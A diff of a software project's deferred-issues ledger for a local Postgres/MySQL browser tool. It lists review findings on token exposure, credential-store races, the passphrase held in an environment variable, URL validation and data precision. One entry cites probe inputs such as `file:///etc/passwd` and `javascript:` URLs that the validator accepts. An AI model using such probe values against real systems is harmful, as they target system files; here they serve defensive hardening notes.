@@ -2,217 +2,374 @@
 
 Append-only ledger of issues surfaced during review that are intentionally deferred (not caused by the current story, or out of its scope). Triaged later by focused attention.
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-1-walking-skeleton.md`
-  summary: Harden the per-boot token against same-machine processes and add a Content-Security-Policy (with a nonce for the inline token script) once stories render database content.
-  evidence: The token is served in cleartext at the ungated `GET /` (the spec's chosen browser handoff), so any local process can scrape it; and `window.__QS_TOKEN__` is script-readable, so a future stored-XSS in rendered DB data could exfiltrate it. Both matter only once data rendering (Epic 3/5) exists; the walking skeleton renders no untrusted data.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-1-walking-skeleton.md`
-  summary: When data-carrying RPCs arrive, have the server map `decode()` failures on untrusted peer FrozenData to a typed `bad_request` (400) instead of letting them throw into the catch-all `internal_error` (500).
-  evidence: `decode` enforces producer-side invariants by throwing `TypeError`; that is correct for internal producers but wrong for untrusted inbound wire data. No RPC decodes untrusted FrozenData in story 1.1, so it is latent until Epic 3.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-1-walking-skeleton.md`
-  summary: Story 1.2's browser-open must target `http://127.0.0.1:<port>`, NOT `http://localhost:<port>`, or the Origin/Host gate rejects every RPC.
-  evidence: `validateOrigin` requires an exact `127.0.0.1:<port>` Host match and treats `localhost` as a distinct (rejected) origin — per the spec's deliberate design. A `localhost` launch URL would make the app appear broken end-to-end with only a `forbidden_origin` error.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-1-walking-skeleton.md`
-  summary: Decouple the Ring-2 UI build from Ring-1 Core availability and stop rebuilding the UI on every boot (bundle at build time / cache) to protect the epic's ≤2s cold-start target.
-  evidence: `startCore` awaits `buildUiBundle()`, so any UI TypeScript/build error currently aborts the whole Core (including the health channel), and every boot re-bundles. Acceptable for a skeleton; a cost/robustness concern for the run-mode and packaging stories (1.2, 1.7).
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-1-walking-skeleton.md`
-  summary: Decide the canonical frozen-date sub-second precision policy (truncate-to-ms vs preserve) before real DB timestamps arrive; the current ISO regex + calendar round-trip only support millisecond precision.
-  evidence: `ISO_UTC_RE` allows only 1–3 fractional digits and `assertIsoUtc` re-serializes through a JS `Date` (millisecond resolution), so Postgres/MySQL microsecond timestamps (`.123456Z`) would throw. No timestamps flow until Epic 1 story 1.3 / Epic 3, and fixing it correctly is a precision-policy decision, not a one-line regex widen.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-1-walking-skeleton.md`
-  summary: Optionally add a max request-body guard (Content-Length limit) on `POST /rpc`.
-  evidence: `await req.json()` buffers an unbounded body. Low risk for a single-user localhost tool (you would only DoS yourself), but a cheap hardening once multi-caller scenarios (Live Reports, Epic 6) appear.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-1-walking-skeleton.md`
-  summary: When story 1.2 makes the port user-configurable, handle the scheme-default ports (80/443) in `validateOrigin` — browsers omit the default port from `Host`/`Origin`, so the exact `host:port` authority match rejects every RPC.
-  evidence: `validateOrigin` builds `expectedAuthority` as `${host}:${port}`, but a browser loading `http://127.0.0.1` (QS_PORT=80) sends `Host: 127.0.0.1` and `Origin: http://127.0.0.1` with no `:80`, so both comparisons fail and every RPC is rejected `forbidden_origin` (app dead-on-arrival). Story 1.1 defaults to ephemeral ports, so this is latent until 1.2 lets the user pin a port.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-6-localhost-binding-port-warning.md`
-  summary: When story 1.2 adds browser-open, do NOT hand the OS launcher `core.url` verbatim for a wildcard bind — `http://0.0.0.0:<port>` (and `http://[::]:<port>`) is a non-routable bind sentinel, not a navigable address; compute a display/open URL of `http://localhost:<port>` instead.
-  evidence: `startCore` builds `core.url = http://${bindHost}:${boundPort}` (`src/core/server.ts`), so under `QS_HOST=0.0.0.0` the boot line prints `listening on http://0.0.0.0:<port>` and any future auto-open would target a dead URL. Truthful-but-unusable today (only the stderr listening line is affected); becomes a real dead-on-open defect once 1.2 wires browser-open. Bind host stays `0.0.0.0` for `Bun.serve`; only the surfaced URL needs the substitution.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-1-keyring-spike.md`
-  summary: Replace the English substring heuristic (`isNotFoundError`) that distinguishes a missing keychain entry (`not-found`) from an unreachable backend (`unavailable`) with typed error codes/kinds from `@napi-rs/keyring`, once the real per-platform error shapes are observed (CI Windows leg / Story 2.2).
-  evidence: Both review layers flagged the substring match as locale-fragile and as the linchpin of the passphrase-fallback decision — on backends that throw NoEntry (e.g. Windows Credential Manager) rather than returning null, a genuine miss or a localized/reworded error could be misclassified. It currently fails safe (unknown → `unavailable`), and the tested Linux path returns null (never hits the throw branch), so the robust fix genuinely needs Windows-observed error data the local spike could not gather. Story 2.2 must not commit Windows to the keychain path until confirmed.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-1-keyring-spike.md`
-  summary: Validate the macOS keychain path for `@napi-rs/keyring` under Bun (a `macos-latest` CI leg + a decision-record row) before the product ships a signed macOS build that relies on the keychain key-management path.
-  evidence: The product targets macOS (`bun.lock` ships all `@napi-rs/keyring-darwin-*` binaries) but Story 2.1's CI matrix is deliberately `ubuntu + windows` per spec, so the macOS Keychain round-trip and compiled-binary native load are unproven. GitHub macOS runners have notoriously locked keychains, making it exactly the leg most likely to need special provisioning; leaving it unvalidated means a macOS user could silently land on the passphrase fallback (or worse) with no per-platform go/no-go on record.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-1-keyring-spike.md`
-  summary: Decide, in Story 2.2's key-load path, whether a keychain entry that round-trips as an empty string (`""`) should be treated as a valid key or rejected as effectively `not-found`; the Ring-1 wrapper currently returns `found` with `value: ""`.
-  evidence: `getSecret` only maps `null`/`undefined` to `not-found`, so a stored empty string surfaces as a legitimate `found` result. That is faithful for a generic wrapper, but an empty AES-256 key is never valid; the guard belongs in Story 2.2's key validation, not in the spike wrapper (patching it here would risk masking a legitimately-stored empty value). Latent until the real store loads keys.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-1-keyring-spike.md`
-  summary: In Story 2.2's durable keychain API, distinguish an invalid-argument error (e.g. empty/blank `service` or `account` making `new Entry()` throw) from a genuine backend-unavailable condition, rather than letting the wrapper's catch-all classify every non-not-found throw as `unavailable`.
-  evidence: `setSecret`/`getSecret`/`deleteSecret` route any thrown error that isn't recognized as not-found straight to `unavailable`, so a programming error (bad service/account) would masquerade as a missing keychain backend and silently trigger Story 2.3's passphrase fallback instead of surfacing the bug. Harmless in Story 2.1 (service/account are hardcoded non-empty constants), but once 2.2 accepts caller-supplied identifiers an argument bug would be indistinguishable from a real keychain outage.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-2-encrypted-credential-store.md`
-  summary: Establish a single-writer guarantee for the credential store — either a cross-process file lock or an OS-level single-instance guard — before two concurrent Core instances (or a re-launch overlapping a slow shutdown) can silently clobber each other's writes or race the master-key generation.
-  evidence: `credential-store.ts` loads the whole record set into an in-memory `Map` and, on each mutation, re-encrypts and atomically renames the entire file; there is no lock or read-modify-write reconciliation. Two live instances over the same dir → last flush wins, silently dropping the other's saved/deleted connections (lost update). Symmetrically, `store-key.ts` `loadOrCreateStoreKey` has a generate-on-`not-found` window where two processes each mint and store a different 32-byte key; the loser's already-encrypted file becomes permanently undecryptable (`corrupt`). Not triggered by Story 2.2 (single localhost Core, single user), but the first persistence substrate makes it latent for any future multi-instance/overlapping-launch scenario; the atomic rename prevents torn files but not lost updates or key races.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-2-encrypted-credential-store.md`
-  summary: When Story 2.3 adds the passphrase fallback, give the "keychain key lost but store file present" case a distinct typed outcome (and a recovery hook) instead of surfacing it as `corrupt`, so it is not confused with malicious tampering and does not invite a destructive overwrite.
-  evidence: `loadOrCreateStoreKey` mints a fresh CSPRNG key on any keychain `not-found` with no awareness that an encrypted `credential-store.enc` already exists. If the keychain entry is lost while the file survives (OS keychain reset, profile migration, Secret Service re-init, logout wipe), the next open generates a new key, decryption fails the auth tag, and `openCredentialStore` returns `corrupt` — indistinguishable from a tampered file. The data encrypted under the vanished key is already unrecoverable (inherent to AES-GCM with a lost key), so this is not data loss caused by Story 2.2, and the store never overwrites on open; but the misclassification and the absence of a "key-missing / file-present" recovery signal belong to Story 2.3's passphrase-fallback design (the sanctioned recovery path for a missing key). Distinct from the single-writer entry above (that is a concurrency/race issue; this is key-lifecycle vs file-lifecycle desync). RESOLVED by Story 2.3 (spec-2-3): the keychain reopen path now maps a regenerated key (`created`) over an existing `.enc` to the distinct typed `key-unavailable`, and the passphrase fallback is the sanctioned recovery path.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-3-passphrase-fallback.md`
-  summary: Provide a non-env passphrase transport (stdin / file descriptor) for the keychain-unavailable fallback and document the `QS_PASSPHRASE` exposure, so the passphrase is not carried in the process environment on exactly the headless hosts the fallback targets.
-  evidence: `envPassphraseProvider` (the intent-contract-sanctioned default provider) reads the passphrase from the `QS_PASSPHRASE` environment variable. On a keychain-less/headless box this leaves the secret readable via `/proc/<pid>/environ` (same-user tooling), inherits it into every spawned child process, and can capture it in core dumps — a well-known env-secret leak vector, though it never touches disk or logs (the store's "never written/logged" invariant holds). The env seam is intentional and functional today; Story 2.4 adds the interactive UI prompt, and a stdin/fd provider plus a documented warning is the proper hardening. Not a bug in Story 2.3 (the env default is by design), but residual security surface worth focused attention before a wider release.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-2-one-command-run-mode-select.md`
-  summary: When Story 1.3 wires the real DB connection, validate the Ephemeral database-URL's scheme/shape (allowlist `postgres`/`postgresql`/`mysql`), rejecting `file:`/`javascript:`/`data:` and Windows drive-path pseudo-URLs (`C:\db` parses as scheme `c:`) that Story 1.2's deliberately shallow `new URL()` shape-check lets through.
-  evidence: `parseCliArgs` (`src/core/cli-args.ts`) validates the DB-URL positional only via `new URL(urlArg)` — which accepts any parseable URL — because engine/scheme validation and the actual connect belong to Story 1.3 (the spec scopes 1.2 to "shape only"). So today a nonsense-but-parseable positional (`file:///etc/passwd`, `C:\db.sqlite`) silently selects Ephemeral and carries a meaningless "URL" forward with no error. Not a bug in 1.2 (by-design deferral, and no connection is attempted here), but Story 1.3 is the sanctioned place to reject non-relational schemes with the "distinguishes host vs auth vs network" clear error the epic requires.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-3-connect-postgres-mysql.md`
-  summary: Add a distinct "database does not exist" connection-failure kind so a valid host+auth pointed at a nonexistent catalog (PG SQLSTATE `3D000`, MySQL `ER_BAD_DB_ERROR`/errno `1049`) is not misreported as `network` ("could not reach the database").
-  evidence: `classifyConnectionError` (`src/core/driver.ts`) maps only auth/host/network codes and defaults everything else to `network`. `ConnectionFailureKind` (`src/shared/contract.ts`) has no bucket for invalid-catalog, so a user who authenticates fine but names a missing database sees the misleading "connection refused, reset, or timed out" message. Real but out of Story 1.3's stated host-vs-auth-vs-network 3-way scope: fixing it correctly means adding a new neutral failure kind to the shared contract (a design decision), not a one-line map widen.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-3-connect-postgres-mysql.md`
-  summary: Classify introspection (`listSchema`) failures that occur AFTER a successful handshake into the neutral `ConnectResult` taxonomy instead of letting a raw engine error escape as `internal_error` (HTTP 500).
-  evidence: The adapters (`driver-postgres.ts`/`driver-mysql.ts`) wrap only `connect()` errors via `toDriverConnectionError`; `listSchema()` throws raw. In `connection.ts` `open()`, a non-`DriverConnectionError` from `await d.listSchema()` (line 92) hits `throw err` (line 104) → `internal_error`. So an authenticated-but-unprivileged account that cannot read `information_schema`, or a connection dropped/reset mid-introspection, surfaces as an opaque 500 rather than a classified `status:"failed"`. Real, but the spec's golden shape deliberately re-throws non-classified errors as bugs and the current 4-kind enum has no natural bucket for a post-handshake permission/introspection error — so the fix is a taxonomy decision (adjacent to the invalid-catalog item above), not a trivial wrap. No live-DB test exercises the privileged-introspection path.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-3-connect-postgres-mysql.md`
-  summary: Bound the introspection query itself (statement/query timeout) or race the connection manager's `close()` against a timer, so a hung `listSchema` cannot block shutdown indefinitely.
-  evidence: `connection.ts` `close()` unconditionally `await`s the in-flight `open()` (lines 143-150) before tearing the driver down, and neither adapter sets a per-statement timeout on the `information_schema.columns` query. If `connect()` succeeds but the introspection query hangs (e.g. a lock on `information_schema`, a stalled server), `close()` never resolves → `Core.stop()` never completes → the port is never released. The postgres `connect_timeout: 10` and the new mysql `CLOSE_TIMEOUT_MS` teardown bound cover connect and teardown, but NOT a wedged query mid-introspection. Real edge; the fix touches the concurrency/shutdown-ordering model (racing inflight vs a bounded query timeout), which is exactly the localized surface the follow-up review is meant to scrutinize.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-1-3-connect-postgres-mysql.md`
-  summary: Distinguish a malformed-but-supported-scheme URL from a genuinely unsupported scheme, so a bad/out-of-range port (or otherwise unparseable authority) on a `postgres`/`mysql` URL is not reported as `unsupported_scheme`.
-  evidence: `schemeOf` (`src/core/driver.ts`) reads the scheme via `new URL(url)`; when the URL is unparseable it returns `null`, and `createDriver` then rejects with `unsupported_scheme`. Confirmed at runtime: `new URL("postgres://host:5432x/db")` and `new URL("postgres://host:99999/db")` both throw `TypeError`, so a supported-scheme URL with a typo'd/out-of-range port yields the message "unsupported database URL scheme (expected postgres or mysql)" — a misleading verdict (the scheme IS supported; the URL is malformed). Real UX papercut, but the 4-kind failure enum has no "malformed URL" bucket, so a correct fix needs a taxonomy/message decision beyond the story's sanctioned wrong-scheme rejection (`file:`/`javascript:`/`data:`/Windows paths).
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-5-persist-workspace-state.md`
-  summary: Surface a persistent `workspace.save` write-failure (disk full / EACCES / app dir removed mid-session) to the user instead of silently `void`-ing the reply, so a developer isn't led to believe their layout is being persisted when every save is failing.
-  evidence: The debounced save in `src/ui/App.tsx` does `void rpc<SaveWorkspaceResult>("workspace.save", …)` — the reply (including `internal_error` from a store `write-failed`, or `saved:false`) is discarded, with no retry and no notification. Real but layout-only (non-critical) data, and surfacing it correctly needs a UX decision (status stamp/toast) beyond Story 2.5's "restore Panel sizes + Tabs" scope; the terse mono status-bar stamp pattern from the epic UX notes is the natural home.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-5-persist-workspace-state.md`
-  summary: Constrain `panelSizes` to exactly two finite numbers in a sane range (e.g. [0,100]) at the workspace-store/registry validation boundary (or sanitize in the UI before it reaches `defaultSize`), so a hand-edited/legacy `workspace-state.json` cannot yield a broken initial split.
-  evidence: `isWorkspaceSnapshot` (`src/core/workspace-store.ts`) and `checkPanelSizes` (`src/core/workspace-registry.ts`) accept ANY-length finite-number array; `App.tsx` only special-cases the empty array. So `[42]`, `[10,20,30]`, or `[-5,105]` survive load/save and flow into `react-resizable-panels` `defaultSize`, producing a split that doesn't sum to 100 or exceeds a Panel's min/max. Unreachable in normal operation (`onLayout` always emits two values summing to 100) — tamper/legacy-file hardening only. Deferred over patched-now because "exactly 2" bakes in the current two-panel design and a future multi-panel layout would want variable length — a design decision, not a mechanical tighten.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-5-persist-workspace-state.md`
-  summary: Flush the pending debounced `workspace.save` on app quit / window unmount so the last layout or tab change made within `SAVE_DEBOUNCE_MS` (400ms) before Stop is not lost.
-  evidence: The save effect cleanup in `src/ui/App.tsx` does `clearTimeout(handle)` with no flush, and `onStop` fires `shutdown` without draining the pending save; there is no `beforeunload` handler. A drag/open immediately followed by quit drops that final change. Narrow window and layout-only, but it's exactly the "last action" a user expects to survive; a correct flush-on-unmount in Electron needs a sync/beacon path, so it's a focused follow-up rather than a trivial patch.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-5-persist-workspace-state.md`
-  summary: Reconcile the `activeTabId: null`-with-tabs-present disagreement between the registry validator (accepts it as valid) and `restoreWorkspace` (rewrites it to the first tab), so a "no active tab" intent is not silently changed on restore.
-  evidence: `workspace-registry.ts` `validateSnapshotParams` explicitly allows `activeTabId: null` even with tabs present (asserted in `workspace-registry.test.ts`), but `src/ui/workspace/workspace-state.ts` `restoreWorkspace` treats `null` as "not among the tabs" (`tabs.some(t => t.id === null)` is always false) and falls back to `tabs[0].id`. Only reachable via a hand-edited file (the live app never emits null-with-tabs), so a low-consequence validator/restore-normalization inconsistency to align deliberately.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-5-persist-workspace-state.md`
-  summary: Enforce tab-id uniqueness across `tabs` in the workspace-store/registry validation so a snapshot with duplicate ids cannot make `closeTab` remove two tabs at once.
-  evidence: Neither `checkTabs` (`src/core/workspace-registry.ts`) nor `restoreWorkspace` (`src/ui/workspace/workspace-state.ts`) rejects duplicate ids; the `activeTabId` set-membership check dedupes and so doesn't catch it. `tabs:[{id:1,…},{id:1,…}]` restores verbatim, and `closeTab`'s `filter(t => t.id !== id)` then removes both. Reachable only via a hand-edited file — hardening, not a normal-operation bug (the pure model's monotonic `nextId` never mints duplicates).
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-5-persist-workspace-state.md`
-  summary: Add a sequencing/generation guard (or single-flight) to `workspace.save` so two overlapping in-flight saves cannot land out of completion order and persist the older snapshot.
-  evidence: `src/ui/App.tsx` can have a slow save S1 in flight when a newer change fires S2; the store (`workspace-store.ts`) uses a unique temp file + `rename` per save (no corruption), but there's no ordering guard, so if S2's rename lands before S1's the older snapshot wins. Low probability given fast local fs renames and the 400ms debounce; a monotonic save-generation check or single-flight-with-trailing would close it.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-2-5-persist-workspace-state.md`
-  summary: Preserve, rather than overwrite, an unreadable-but-newer-version `workspace-state.json` (e.g. a `version: 2` file opened by an older `version: 1` build) so a downgrade launch doesn't destroy a future build's saved state.
-  evidence: `isWorkspaceSnapshot` (`src/core/workspace-store.ts`) degrades a version mismatch to `null` (a *successful* load), so `App.tsx` enables saving and the first user change writes a `version: 1` snapshot over the `version: 2` file. The Story 2.5 data-loss patch only guards load *errors*, not a successful degrade-to-null. Spec explicitly allows "version-mismatch → fresh workspace", and `version: 2` does not exist yet, so this is a forward-compat hardening (e.g. back up or refuse-to-overwrite a newer-version file) for whenever the snapshot schema next changes.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-2-browse-rows-pagination.md`
-  summary: Project the Postgres `Driver.query` read path from positional column descriptors instead of a name-keyed row object, so duplicate/aliased column names in a future raw-SQL result are not collapsed (MySQL's `rowsAsArray` path already returns positional arrays).
-  evidence: `driver-postgres.ts` `query` builds each row via `cols.map(c => row[c.name])` on postgres.js's name-keyed row object; two same-named result columns collapse to one value, and the two engines diverge (mysql2 uses `rowsAsArray:true`). The browse SELECT can never trigger it (single-table columns are unique), but `Driver.query`/`quoteIdent` is the shared seam the Story 3.6 raw-SQL path will reuse, where aliased/duplicate columns are common. Latent until raw SQL exists; the fix is an engine-adapter change (postgres.js `.values()`), not a browse-behavior bug.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-2-browse-rows-pagination.md`
-  summary: Type-color and align result-grid columns by their SQL `dataType` (numeric/decimal/bigint → number), not only by the neutral `FrozenCell` kind, so string-encoded numeric columns are not rendered as TEXT — the same SQL-type plumbing the deferred `t-json` color needs.
-  evidence: postgres.js returns `numeric`/`decimal`/`int8` and mysql2 returns `DECIMAL`/`BIGINT` as JS strings (and `bigint` is deliberately forced to string for precision), so `naturalKind` in `frozen-map.ts` classifies them `string`; `DataGrid.tsx` then labels them `TEXT`, left-aligns, and drops `tabular-nums`. Values are correct — only the header type/alignment is wrong. The spec deliberately colors by neutral kind (and already defers `t-json` for the same reason); fixing both needs the SQL `dataType` carried alongside the result columns, a contract/plumbing decision beyond this story.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-2-browse-rows-pagination.md`
-  summary: Report a composite `SchemaTableInfo.primaryKey` in the key's own ordinal order (`ORDER BY ordinal_position` in both PK introspection queries) rather than in table-column order.
-  evidence: `assembleSchema` (`driver.ts`) builds `primaryKey` by pushing PK column names in the columns query's schema/table/ordinal order gated by a membership Set, and neither the Postgres nor MySQL PK query orders by `ordinal_position`. For a composite PK whose key order differs from column order (PK `(b,a)` with `a` earlier in the table), `primaryKey` is `["a","b"]` — misreported. Pagination stays correct (the ORDER BY set is still total/deterministic) and the grid PK icon (membership-based) is unaffected, so it is invisible in Story 3.2; it matters once a consumer relies on PK column order (e.g. Story 3.3 row edit/where-clause construction).
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-2-browse-rows-pagination.md`
-  summary: Acknowledge (and, if desired, mitigate with keyset/snapshot pagination) that the `table.rows` COUNT and page SELECT are two non-atomic round-trips, so `total` and page contents can disagree — and OFFSET pages can drift — under concurrent writes to the browsed table.
-  evidence: `server.ts` `tableRows` issues `connectionManager.query(countSql)` then `query(selectSql)` with no shared snapshot/transaction; a concurrent insert/delete between them (or before the offset) makes `total` inconsistent with the returned page and shifts OFFSET-based pages. This is inherent to OFFSET pagination rather than a defect in the composition, and this is a read-only browse of a live DB (staleness is expected), so it is a known-limitation note rather than a Story 3.2 bug; keyset (seek) pagination on the PK is the durable fix if it becomes user-visible.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-2-browse-rows-pagination.md`
-  summary: Make the keyless-table (no-PK) browse ordering robust — the static `UNORDERABLE_TYPE_PREFIXES` heuristic in `table-rows.ts` can both silently omit `ORDER BY` (rows overlap/skip across pages) and emit an `ORDER BY` the engine rejects (hard `internal_error`, blank grid), depending on the table's column types.
-  evidence: `isOrderable` (`src/core/table-rows.ts`) classifies orderability by a hardcoded type-prefix denylist. For a PK-less table it either (a) filters out every column and omits `ORDER BY` entirely — so two separate page requests can return rows in different physical orders (overlap/skip, silent corrupt paging even with no concurrent writes) — or (b) passes a column that *looks* orderable but has no default ordering operator (Postgres `USER-DEFINED`/composite/`record`/`tsvector`/`pg_lsn`, `ARRAY`, or MySQL variants the prefix list misses such as `mediumblob`), so the composed `ORDER BY` throws at the DB and the whole page collapses to `internal_error` instead of degrading. Only affects keyless tables with exotic column types (PK tables order by the PK and are unaffected); the robust fix is a design decision — engine-aware orderability (which would leak ordering semantics into the driver seam), catch-and-degrade, or keyset pagination — not a mechanical widening of the prefix list. Distinct from the non-atomic COUNT/SELECT drift entry (that is concurrent-write staleness; this is a non-total page order / hard failure under zero writes).
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-2-browse-rows-pagination.md`
-  summary: Decide how a `timestamp without time zone` value should be represented in the neutral FrozenCell model — `rowsToFrozenData` stamps a UTC `Z` ISO string on every JS `Date`, so a tz-less wall-clock timestamp is displayed as though it were UTC.
-  evidence: `frozen-map.ts` routes any `Date` through `toIsoUtc`, which serializes with a `Z`/UTC suffix. A Postgres `timestamp without time zone` (and MySQL `DATETIME`) carries no timezone, but postgres.js/mysql2 hand it back as a JS `Date`; tagging it UTC asserts a timezone the column does not have, shifting displayed times for any non-UTC-intending data. Genuine `timestamptz` round-trips correctly; the gap is representational and only visible for naive-timestamp columns. Correcting it needs a contract decision (carry a naive-vs-aware distinction, or the SQL `dataType`) rather than a one-line mapper tweak — adjacent to the deferred SQL-`dataType`-aware typing item.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-2-browse-rows-pagination.md`
-  summary: Preserve MySQL `BIGINT` precision in the browse read path — the mysql2 connection uses default numeric handling, so a `BIGINT` above 2^53 comes back as a precision-lossy JS number and is displayed rounded.
-  evidence: `driver-mysql.ts` opens the connection without `supportBigNumbers`/`bigNumberStrings`, so mysql2 decodes `BIGINT` columns to JS `number`; `frozen-map.ts` `naturalKind` then classifies the finite number as `"number"` and emits it verbatim, so a value like `9007199254740993` renders as `…992`. The mapper's bigint→string safety net only fires when the driver returns an actual `bigint`, which this config never produces for `BIGINT`. Rare (values beyond 2^53) and a driver-config/typing decision (enable big-number strings, or carry the SQL `dataType`) rather than a browse-composition bug; postgres.js already returns `int8` as a string and is unaffected.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-1-guarded-core-executor.md`
-  summary: Bound the FETCH (not just the display slice) for auto-classified raw reads — push a `LIMIT MAX_RESULT_ROWS + 1` or use a server cursor so a `SELECT * FROM huge_table` cannot materialize the whole result set into Core memory before the 1000-row cap applies.
-  evidence: `executor.ts` `executeRaw` read path runs `runReadOnly(stmt, [])` then `toRowsResult` slices to `MAX_RESULT_ROWS` AFTER the driver (postgres.js / mysql2) has already buffered every row in memory. The Core-side cap only bounds the response payload, not the fetch, so a large read OOMs the Core process. Story 3.1 explicitly scopes DB-side pagination/`LIMIT` to Story 3.2 ("a Core-side row cap is the only responsiveness measure here"), so this is a known-limitation deferral to the pagination story, not a 3.1 defect — but the current cap gives no memory protection.
-  reviewer_severity: medium
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-1-guarded-core-executor.md`
-  summary: Make the structured `createTable` type/constraint allowlist engine-aware — postgres-only tokens (`UUID`, `JSONB`, `TIMESTAMPTZ`, `SERIAL`, …) and bare `VARCHAR` (no length) compose invalid DDL on MySQL and fail opaquely at the engine.
-  evidence: `executor.ts` `CREATE_TABLE_TYPES` is a single engine-blind allowlist; `executeCreateTable` emits the validated token verbatim. On MySQL a "valid" structured `createTable` carrying `UUID`/bare `VARCHAR` composes DDL the engine rejects → `internal_error`. Not a safety hole (values are still parameterized, identifiers quote-escaped, and it fails closed at the engine with no raw-text echo), purely a contract-quality gap; the fix is to gate/map type tokens per engine.
-  reviewer_severity: low
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-1-guarded-core-executor.md`
-  summary: Map postgres raw-read result rows positionally (array row-mode) rather than by column name, so a `SELECT` with duplicate output column names (`SELECT id, id`, `a.id, b.id`) does not collapse same-named columns to a single (last) value.
-  evidence: The postgres adapter (`driver-postgres.ts`, pre-existing from Story 3.2's `query`) builds row values keyed by column name; a raw `SELECT` can produce duplicate output names, and the object-keyed mapping then shows the last value for every duplicate, losing the distinct columns' data. Invisible for Story 3.2 browse (real table columns are unique); Story 3.1 exposes it by routing arbitrary raw `SELECT`s through the same mapping. Fix: use postgres.js array/`values()` row mode and align to the ordered column metadata (mysql already uses `rowsAsArray`).
-  reviewer_severity: low
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-1-guarded-core-executor.md`
-  summary: Document (or make configurable) the raw-SQL splitter's assumption of default session SQL modes — it assumes postgres `standard_conforming_strings = on` and MySQL default `sql_mode` (no `NO_BACKSLASH_ESCAPES`, no `ANSI_QUOTES`); non-default modes shift string/identifier boundaries.
-  evidence: `executor.ts` splitter activates backslash-escaping only for mysql strings and postgres `E'…'` strings. Under postgres `standard_conforming_strings=off`, plain `'…'` strings become backslash-active → splitter over-counts (valid statement falsely rejected — fail-safe). Under MySQL `NO_BACKSLASH_ESCAPES`, `'\''` is `\` + close-quote → splitter could under-count, but this is backstopped by the now-unconditional `multipleStatements:false`. All divergences are either over-reject (safe) or backstopped, and require a non-default server session config; the durable options are to read the session settings or document the assumption. No live exploit at default configs.
-  reviewer_severity: low
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-3-3-edit-insert-delete-rows.md`
-  summary: Bind bigint/int8/numeric columns without JS `Number` precision loss on both the write value and the PK address — a value beyond `Number.MAX_SAFE_INTEGER` is silently truncated on edit/insert, and a lossy PK read makes `WHERE pk = <lossy>` address the wrong row (or none) on update/delete.
-  evidence: `row-mutations.ts` `coerceValue("number")` uses `Number(raw)` and `pkForRow`/`cellToValue` read the PK from `FrozenCell` as a JS `number` (`cell.value`). The precision loss originates upstream in Story 3.2's `FrozenCell` number representation (bigint already arrives as a lossy JS number from the browse read); Story 3.3 is the first to WRITE with it, exposing a silent wrong-value / wrong-row data-corruption path with no error surfaced. Story 3.3 explicitly scopes DB-type-aware editors via `SchemaColumnInfo` out (deferred) and documents the kind-inference limitation, so the durable fix (thread column types + carry wide integers as strings/bigint across the wire) belongs with that deferred type-threading work, not the 3.3 UI. Two independent review passes flagged it as the highest-consequence item in the diff.
-  reviewer_severity: high
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-4-1-render-erd.md`
-  summary: Reset `createdTables` on connect/disconnect so optimistically-created tables don't accumulate across reconnects and shadow the re-introspected schema.
-  evidence: `src/ui/App.tsx` only ever appends to `createdTables` (never clears it), so after a reconnect a created table appears in both `schemaTables` and `createdTables`, and after connecting to a different database a stale phantom table survives. Pre-existing Epic-3 lifecycle behavior masked by SchemaTree's dedup; the ERD's new dedup patch prevents the duplicate-id crash but the stale phantom node remains until this root cause is fixed.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-4-1-render-erd.md`
-  summary: Exclude inherited partition FK constraints (`pg_constraint.conparentid <> 0`) from the Postgres FK introspection so partitioned schemas don't render N+1 redundant edges.
-  evidence: `src/core/driver-postgres.ts` filters only `contype='f'`; on a partitioned parent every partition carries an inherited copy of the FK, producing duplicate near-identical edges. Fix is a one-line `AND con.conparentid = 0` but carries a minor Postgres-version-compatibility consideration (conparentid exists in PG 11+), so it warrants focused attention.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-4-1-render-erd.md`
-  summary: Preserve ERD layout stability when a table is created (avoid a full dagre reshuffle of every node) — naturally addressed alongside Story 4.2 layout persistence.
-  evidence: `src/ui/workspace/ErdTabView.tsx` re-runs `schemaToGraph`+dagre whenever the `tables` identity changes, so creating a table via the Epic-3 builder jumps every node to a new position. Low severity (only pan/zoom context is preserved); best solved with the persisted-layout work in Story 4.2.
-
-- source_spec: `_bmad-output/implementation-artifacts/spec-4-1-render-erd.md`
-  summary: Decide how to signal cross-database MySQL foreign keys instead of silently dropping their edges in the ERD.
